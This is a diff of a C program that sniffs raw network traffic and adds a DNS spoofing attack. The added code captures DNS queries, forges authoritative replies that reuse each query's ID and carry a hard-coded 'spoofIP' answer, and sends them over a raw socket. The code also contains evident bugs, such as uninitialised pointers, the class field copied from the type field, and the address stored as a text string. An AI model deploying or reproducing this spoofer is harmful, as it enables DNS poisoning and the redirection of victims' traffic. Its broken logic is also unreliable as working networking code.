@@ -9,17 +9,17 @@
 #include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <net/if.h>   //ifreq
+
 
 #include<netinet/ip.h> // ip header
 #include<netinet/udp.h> 
 #include <linux/if_ether.h>
 
 
-
-
-
+// Custom headers
+#include "udpHandler.h"
+#include "ipHandler.h"
+#include "etherHandler.h"
 
 // Pseudo IP header for UDP checksum calculation
 // Sizeof this pseudo_header = 88 bits (11 bytes)
@@ -75,64 +75,50 @@ typedef struct
 	QUESTION *ques;
 } QUERY;
 ///////////////////////////////////////////////////////////////////
+// Structures specific to answer only
+#pragma pack(push, 1)
+typedef struct
+{
+	unsigned short type;
+	unsigned short _class;
+	unsigned int ttl; // ttl is 32 bits
+	unsigned short data_len;
+} RR_CONSTANT_FIELD;
+#pragma pack(pop)
 
-int parseBuffer(char * buffer, unsigned char * mac1);
+// complete Resource record (RR):
+typedef struct 
+{
+	unsigned char *name;
+	RR_CONSTANT_FIELD *resource;
+	unsigned char *rdata;
+} RES_RECORD;
+/////////////////////////////////
+
+unsigned int createSpoofDNS(int *newNameLen, char * orgBuffer, char * Buffer, 
+	DNS_HEADER * spoofDNSHeader, DNS_HEADER * dnsHeader); 
+DNS_HEADER * dnsHeader = (DNS_HEADER *)malloc(sizeof(DNS_HEADER));
+struct ethhdr * eHeader = (struct ethhdr *) malloc(sizeof(struct ethhdr));
+struct iphdr * ipHeader = (struct iphdr *) malloc(sizeof(struct iphdr));
+struct udphdr * udpHeader = (struct udphdr *) malloc(sizeof(struct udphdr));
+
+struct ethhdr * spoofETHHeader = (struct ethhdr *) malloc(sizeof(struct ethhdr));
+struct iphdr * spoofIPHeader = (struct iphdr *) malloc(sizeof(struct iphdr));
+struct udphdr * spoofUDPHeader = (struct udphdr *) malloc(sizeof(struct udphdr));
+	
+
+
+
+
+int parseBuffer(int *newNameLen, char * buffer, unsigned char * mac1);
 
 // Parse and print header information
-int printIPheader(struct iphdr * ipHeader);
-int printUPDheader(struct udphdr *udpHeader);
-int printDNSInfo(DNS_HEADER *dnsHeader, char * queryName);
 
-unsigned short calc_checksum(unsigned short *datagram, unsigned int tot_len)
-{
-	unsigned long sum;
-	// Add over 16 bits (unsigned short)
-	for (sum = 0; tot_len > 0; tot_len--)
-	{
-		sum += *datagram++;		
-	}
-	// Add remaining last 8 bits now
-	//if (datagram)
-	//{
-	//	sum += datagram;
-	//}
-	
-	// Add carry now
-	sum = sum >> 16 + (sum & 0xffff);
-	sum += sum >> 16;
-	
-	return (unsigned short)(~sum);
-}
 
-int getMAC(const char *intf, unsigned char *macaddr)
-{
-	struct ifreq *ifreq_buffer;
-	ifreq_buffer = (struct ifreq *)malloc(sizeof(struct ifreq));
-
-	memset(ifreq_buffer, 0, sizeof(struct ifreq));
-	ifreq_buffer->ifr_addr.sa_family = AF_INET;
-	memcpy(ifreq_buffer->ifr_name, intf, IFNAMSIZ-1);
-
-	// Create socket to send ioctl req to 
-	int s;
-	if ( (s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0 )
-	{
-		printf("Socket creation for getMAC failed\n");
-		return -1;
-	}
-	// ioctl
-	if ( (ioctl(s, SIOCGIFHWADDR, ifreq_buffer)) < 0)
-	{
-		printf("Can't get MAC address\n");
-		return -1;
-	}
-
-	memcpy(macaddr, ifreq_buffer->ifr_hwaddr.sa_data, ETH_ALEN);
-	// printf("MAC addr of intf: %s, is %s\n", intf, macaddr);
-
-	free(ifreq_buffer);
-	return 0;
-}
+int printDNSInfo(int *newNameLen, DNS_HEADER *dnsHeader, char * queryName);
+char * DNStoNormal(char *name);
+int sendSpoofReply(char * newBuffer, struct ethhdr *spoofETHHeader, struct iphdr *spoofIPHeader, 
+	struct udphdr *spoofUDPHeader, unsigned int dns_length);
 
 int create_socket()
 {
@@ -325,7 +311,27 @@ int receiveDataRaw(unsigned char * mac1)
 		}
 		else
 		{
-			parseBuffer(buffer, mac1);
+			char newBuffer[65535] = {0};
+			int newNameLen = 0;
+			if (parseBuffer(&newNameLen, buffer, mac1) == 1)
+			{
+				
+				createSpoofEthhdr(eHeader, spoofETHHeader);
+				unsigned int dns_length = 0;
+				DNS_HEADER * spoofDNSHeader;
+				dns_length = createSpoofDNS(&newNameLen, buffer, newBuffer + sizeof(struct ethhdr)
+					+ sizeof(iphdr) + sizeof(udphdr), spoofDNSHeader, dnsHeader);
+				unsigned long ipsrc, ipdest;
+				unsigned short portsrc = getSrcPort(buffer, &portsrc);
+				getIPinfo(buffer, &ipsrc, &ipdest);
+
+				ipHeader = (struct iphdr*) (buffer + sizeof(struct ethhdr));
+				udpHeader = (struct udphdr *) (buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
+				createSpoofIPhdr(newBuffer, ipHeader, spoofIPHeader, dns_length);
+				createSpoofUDPhdr(udpHeader, spoofUDPHeader, dns_length);
+				sendSpoofReply(newBuffer, spoofETHHeader, spoofIPHeader, spoofUDPHeader, dns_length);
+
+			}
 			// printf("Len %d bytes received\n", len);
 		}
 
@@ -341,10 +347,101 @@ int receiveDataRaw(unsigned char * mac1)
 
 }
 
-int parseBuffer(char * buffer, unsigned char * mac1)
+
+
+int sendSpoofReply(char * newBuffer, struct ethhdr *spoofETHHeader, struct iphdr *spoofIPHeader, 
+	struct udphdr *spoofUDPHeader, unsigned int dns_length)
+{
+	int s;
+	if ( (s = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) < 0 )
+	{
+		printf("Raw socket creation failed\n");
+		return -1;
+	}
+
+	sockaddr_in destAddr;
+	destAddr.sin_family = AF_INET;
+	destAddr.sin_addr.s_addr = spoofIPHeader->daddr;
+	destAddr.sin_port = htons(53);
+
+	if ( sendto(s, newBuffer, sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + 
+		dns_length, 0, (sockaddr *) &destAddr, sizeof(destAddr)) == -1)
+	{
+		printf("Spoof reply send failed\n");
+		return -1;
+	}
+
+}
+
+unsigned int createSpoofDNS(int *newNameLen, char * orgBuffer, char * newBuffer, DNS_HEADER *header, DNS_HEADER *dnsHeader)
+{
+	// DNS_HEADER * header = (DNS_HEADER *) newBuffer;
+
+	header->id = dnsHeader->id;
+	header->rd = dnsHeader->rd; // recursion desired
+	header->tc = 0; // no truncation
+	header->aa = 1; // authoritative answer, for response only
+	header->opcode = dnsHeader->opcode; // 0 = standard query
+	header->qr = 1; // qr is 1 for response only
+
+	header->ra = 0; // no recursion available
+	header->z = 0 ; // z is 0
+	header->ad = 0; // z is supposed to be 3 bits but we take only 1 bit for z and 
+	// rest two for 'ad' and 'cd'	
+	header->cd = 0;
+	header->rcode = 0; // response code, 0 in queries
+	header->q_count = dnsHeader->q_count; // no. of questions
+	header->ans_count = 1; // 0 for queries
+	header->auth_count = 0;
+	header->add_count = 0;
+
+	// Handle qname and QUESTION now
+	unsigned char *qname;
+	qname = (unsigned char*) (orgBuffer + sizeof(DNS_HEADER));
+	// unsigned char temphostname[] = "www.stanford.edu";
+	// unsigned char temphostname[] = "www.google.com";
+	// ChangetoDnsNameFormat(qname , temphostname);
+
+	// printf("qname is: %s\n", qname);
+	// unsigned short tempval = htons(0xffff);
+	// qname = (unsigned char*)&tempval; // In DNS format
+	// qname = temphostname;
+
+	printf("len of qname: %d\n", (int)strlen((const char*)qname));
+	QUESTION * question = (QUESTION *)(orgBuffer + sizeof(DNS_HEADER) + *newNameLen);
+
+	memcpy(newBuffer + sizeof(DNS_HEADER), qname, *newNameLen);
+
+	QUESTION * newQestion = (QUESTION *) (newBuffer + sizeof(DNS_HEADER) + *newNameLen);
+
+	newQestion->qtype = question->qtype; // requesting ipv4 address
+	newQestion->qclass = question->qtype; // internet means 1 for class
+
+	// Copy answer part
+	RES_RECORD * answerStruct = (RES_RECORD *) (newBuffer + sizeof(DNS_HEADER) + *newNameLen + sizeof(QUESTION));
+
+	memcpy(answerStruct->name, qname, *newNameLen);
+
+	answerStruct->resource->type = htons(1);
+	answerStruct->resource->_class = htons(1);
+	answerStruct->resource->ttl = htons(34);
+	answerStruct->resource->data_len = htons(4); // 4 bytes?
+
+	const char spoofIP[] = "8.8.8.8";
+	memcpy(answerStruct->rdata, spoofIP, strlen(spoofIP) + 1);
+	
+
+	return (sizeof(DNS_HEADER) + *newNameLen + sizeof(QUESTION) + sizeof(RES_RECORD));
+}
+
+
+
+
+
+int parseBuffer(int *newNameLen, char * buffer, unsigned char * mac1)
 {
 	// ethhdr
-	struct ethhdr * eHeader = (struct ethhdr *)buffer;
+	eHeader = (struct ethhdr *)buffer;
 
 	if ( !memcmp((const void*)mac1, (const void*)eHeader->h_source, ETH_ALEN) )
 	{
@@ -363,77 +460,78 @@ int parseBuffer(char * buffer, unsigned char * mac1)
 	}
 
 	// iphdr
-	struct iphdr * ipHeader = (struct iphdr *)(buffer + sizeof(struct ethhdr));
-	
-
-
-	struct udphdr * udpHeader = (struct udphdr *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr));
-
-
+	ipHeader = (struct iphdr *)(buffer + sizeof(struct ethhdr));
+	udpHeader = (struct udphdr *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr));
 
 	if (printUPDheader(udpHeader) == 1)
 	{
-		DNS_HEADER * dnsHeader = (DNS_HEADER *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr)
+		dnsHeader = (DNS_HEADER *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr)
 								+ sizeof(struct udphdr));
 		char *queryName = (char *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr)
 								+ sizeof(struct udphdr) + sizeof(DNS_HEADER));
 
 		printIPheader(ipHeader);
-		printDNSInfo(dnsHeader, queryName);
+		printDNSInfo(newNameLen, dnsHeader, queryName);
+		printf("--------------------\n");
+		return 1;
 	}
+	else
+		return 0;
 
 
 }
 
 
 
-int printDNSInfo(DNS_HEADER *dnsHeader, char * queryName)
+int printDNSInfo(int *newNameLen, DNS_HEADER *dnsHeader, char * queryName)
 {
 	printf("dnsHeader->q_count: %d\n", ntohs(dnsHeader->q_count));
 	// printf("dnsHeader->dest: %d\n", ntohs(udpHeader->dest));
 	// printf("dnsHeader->len: %d\n", ntohs(udpHeader->len));
 	// printf("dnsHeader->check: %d\n", ntohs(udpHeader->check));
-	printf("queryName: %s\n", queryName);
-
+	char * newName = DNStoNormal(queryName);
+	*newNameLen = strlen(newName) + 2; // +2 = 1 for \0 and 1 for the last '.' in dns format
+	printf("queryName: %s\n", newName);
+	free(newName);
 	return 0;
 }
 
-int printUPDheader(struct udphdr *udpHeader)
+char *DNStoNormal(char *name)
 {
-	if ( (ntohs(udpHeader->dest) == 53) || (ntohs(udpHeader->dest) == 53) )
-	{
-		printf("udpHeader->source: %d\n", ntohs(udpHeader->source));
-		printf("udpHeader->dest: %d\n", ntohs(udpHeader->dest));
-		printf("udpHeader->len: %d\n", ntohs(udpHeader->len));
-		// printf("udpHeader->check: %d\n", ntohs(udpHeader->check));
+	char * newName = (char *) malloc(strlen(name) + 1);
+	int p;
+	int i, j;
+    for(i=0;i<(int)strlen((const char*)name);i++)
+    {
+        p=name[i];
+        for(j=0;j<(int)p;j++) 
+        // for(j=0;j<p - '0';j++)  // can we use p - '0' ? 
+        {
+            newName[i]=name[i+1];
+            i=i+1;
+        }
+        newName[i]='.';
+    }
+    // name[i-1]='\0'; //remove the last dot
+    newName[i-1]='\0'; //remove the last dot // i -2 or -1
 
-		return 1;
-	}
-
-	return 0;
+    // *namelen = strlen(newName);
+    return newName;
 }
 
-int printIPheader(struct iphdr * ipHeader)
+
+
+
+
+int getSrcPort(char * buffer, unsigned short * portsrc)
 {
-	printf("ip: \n");
-	// printf("ipHeader->ihl: %d\n", ipHeader->ihl);
-	// printf("ipHeader->version: %d\n", ipHeader->version);
-	// printf("ipHeader->tos: %d\n", ipHeader->tos);
-	// printf("ipHeader->tot_len: %d\n", ipHeader->tot_len);
-	// printf("ipHeader->id: %d\n", ipHeader->id);
-	// printf("ipHeader->frag_off: %d\n", ipHeader->frag_off);
-	// printf("ipHeader->ttl: %d\n", ipHeader->ttl);
-	// printf("ipHeader->protocol: %d\n", ipHeader->protocol);
-	printf("ipHeader->check: %d\n", ipHeader->check);
-
-	struct in_addr temp_src, temp_dest;
-	temp_src.s_addr = ipHeader->saddr;
-	temp_dest.s_addr = ipHeader->daddr;
-	printf("ipHeader->srcIP: %s\n", inet_ntoa(temp_src));
-	printf("ipHeader->destIP: %s\n", inet_ntoa(temp_dest));
+	struct udphdr * udpHeader = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
+	*portsrc = udpHeader->source;
 
 	return 0;
 }
+
+
 
 int main()
 {
